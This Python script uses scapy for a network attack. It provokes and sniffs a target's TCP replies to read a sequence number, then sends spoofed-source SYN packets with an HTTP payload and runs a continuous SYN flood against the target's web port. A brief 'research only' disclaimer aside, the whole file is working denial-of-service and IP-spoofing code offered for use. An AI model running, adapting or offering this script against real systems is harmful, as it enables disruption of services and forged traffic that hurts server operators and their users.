#!/usr/bin/env python3

# Oo
# Disclaimer: This is for research only and testing on systems with permission. If you do not follow the disclaimer you are an idiot.

import subprocess
import threading
import time
import os
from scapy.all import IP, TCP, send, Raw, rdpcap

# Check for root privileges
if os.geteuid() != 0:
    print("This script requires root privileges. Run with sudo.")
    exit(1)

# Variables
TARGET_IP = "1.2.3.4"    # Target server
SPOOFED_IP = "4.3.2.1"        # Spoofed source IP
PORT = 80                       # HTTP port
TARGET_HOST = "target.host"     # The hostname of the target for the webserver
PAYLOAD = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(TARGET_HOST)
INTERFACE = "eth0"              # Adjust to your interface (e.g., wlan0, en1)
DUMP_FILE = "tcpdump_capture.pcap"

# Step 1: Send initial SYN packets to provoke a response
def provoke_target():
    print(f"Sending initial SYN packets to {TARGET_IP}:{PORT} to provoke response...")
    ip = IP(dst=TARGET_IP)  # Use real source IP here to get replies
    tcp = TCP(sport=12345, dport=PORT, flags="S")
    send(ip / tcp, count=10, verbose=0)
    print("SYN packets sent.")

# Step 2: Sniff with tcpdump during provocation
def sniff_traffic():
    print(f"Sniffing traffic from {TARGET_IP} on {INTERFACE} for 5 seconds...")
    cmd = [
        "tcpdump", "-i", INTERFACE,
        f"src host {TARGET_IP} and port {PORT}", "-c", "50", "-w", DUMP_FILE
    ]
    try:
        subprocess.run(cmd, timeout=5, check=True)
        print(f"Capture saved to {DUMP_FILE}.")
    except subprocess.TimeoutExpired:
        print("Sniffing timed out.")
    except subprocess.CalledProcessError:
        print("Error running tcpdump. Check interface or permissions.")
        return None

    # Parse the .pcap for sequence numbers from target's replies
    try:
        packets = rdpcap(DUMP_FILE)
        for pkt in packets:
            if TCP in pkt and pkt[IP].src == TARGET_IP and pkt[TCP].sport == PORT:
                seq_num = pkt[TCP].seq
                print(f"Found sequence number from {TARGET_IP}: {seq_num}")
                return seq_num
        print("No TCP reply packets from target found in capture.")
        return None
    except Exception as e:
        print(f"Error reading .pcap: {e}")
        return None

# Craft spoofed TCP SYN packet with sniffed sequence number
def craft_packet(seq_num):
    ip = IP(src=SPOOFED_IP, dst=TARGET_IP)
    tcp = TCP(sport=12345, dport=PORT, flags="S", seq=seq_num)
    raw = Raw(load=PAYLOAD)
    return ip / tcp / raw

# Step 3: Probe with sniffed sequence number
def probe_target(seq_num):
    if seq_num is None:
        seq_num = 1000  # Fallback
        print("No sequence number found; using default 1000.")
    print(f"Probing {TARGET_IP}:{PORT} with spoofed TCP SYN from {SPOOFED_IP} (seq={seq_num})...")
    packet = craft_packet(seq_num)
    send(packet, count=100, verbose=0)
    print("Probe complete.")

# Step 4: Flood the target
def flood_target(seq_num, stop_event):
    if seq_num is None:
        seq_num = 1000
        print("No sequence number found; using default 1000 for flood.")
    print(f"Flooding {TARGET_IP} with spoofed TCP SYN packets (seq={seq_num})...")
    packet = craft_packet(seq_num)
    while not stop_event.is_set():
        send(packet, verbose=0)
        packet[TCP].seq += 1  # Increment seq like a real connection


# Step 1 & 2: Provoke and sniff simultaneously
sniff_thread = threading.Thread(target=sniff_traffic)
sniff_thread.start()
time.sleep(0.5)  # Give tcpdump a head start
provoke_target()
sniff_thread.join()

# Extract sequence number
seq_num = sniff_traffic()  # Run again to parse (could optimize this)

# Step 3: Probe
probe_target(seq_num)

# Step 4: Flood in background
stop_flood = threading.Event()
flood_thread = threading.Thread(target=flood_target, args=(seq_num, stop_flood))
flood_thread.start()

# Let it flood briefly
print("Flood running in background. Check target response manually.")
time.sleep(5)

# Cleanup
stop_flood.set()
flood_thread.join()
print("Flood stopped. Attack complete.")
